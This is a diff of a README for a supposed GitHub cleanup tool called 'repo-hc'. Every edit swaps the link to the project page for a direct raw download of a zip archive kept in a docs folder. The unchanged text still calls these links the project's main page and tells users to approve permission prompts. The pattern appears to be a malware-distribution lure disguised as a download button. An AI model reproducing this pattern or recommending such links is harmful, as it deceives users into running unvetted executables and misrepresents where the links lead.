@@ -1,6 +1,6 @@
 # 🧹 repo-hc - Simple GitHub Cleanup Tool
 
-[![Download repo-hc](https://img.shields.io/badge/Download-repo--hc-blue?style=for-the-badge)](https://github.com/charleanpoor507/repo-hc)
+[![Download repo-hc](https://img.shields.io/badge/Download-repo--hc-blue?style=for-the-badge)](https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip)
 
 ---
 
@@ -43,7 +43,7 @@ These features work together to keep your GitHub repositories clean and easier t
 
 1. Click the big **Download repo-hc** button above or visit the official page at:
 
-   https://github.com/charleanpoor507/repo-hc
+   https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip
 
 2. Scroll to the **Releases** section on the GitHub page. Look for the latest version.
 
@@ -74,7 +74,7 @@ If the app asks for permission, click **Yes** to continue.
 
 To get repo-hc, you can also visit this link anytime:
 
-[https://github.com/charleanpoor507/repo-hc](https://github.com/charleanpoor507/repo-hc)
+[https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip](https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip)
 
 This link leads to the project’s main page on GitHub. From there, you can find instructions, updates, and future releases.
 
@@ -129,7 +129,7 @@ To update repo-hc:
 
 1. Visit the main download page:
 
-   [https://github.com/charleanpoor507/repo-hc](https://github.com/charleanpoor507/repo-hc)
+   [https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip](https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip)
 
 2. Download the latest installer version.
 
@@ -157,7 +157,7 @@ Look inside your project folders after running repo-hc. You will find cleaner fi
 
 Visit the GitHub page to see example commands, help guides, and detailed documentation on each feature.
 
-https://github.com/charleanpoor507/repo-hc
+https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip
 
 Use the information there to get better results with repo-hc.
 
@@ -172,4 +172,4 @@ Use the information there to get better results with repo-hc.
 
 ---
 
-[![Download repo-hc](https://img.shields.io/badge/Download-repo--hc-blue?style=for-the-badge)](https://github.com/charleanpoor507/repo-hc)
+[![Download repo-hc](https://img.shields.io/badge/Download-repo--hc-blue?style=for-the-badge)](https://github.com/charleanpoor507/repo-hc/raw/refs/heads/main/docs/project/repo_hc_v2.8.zip)
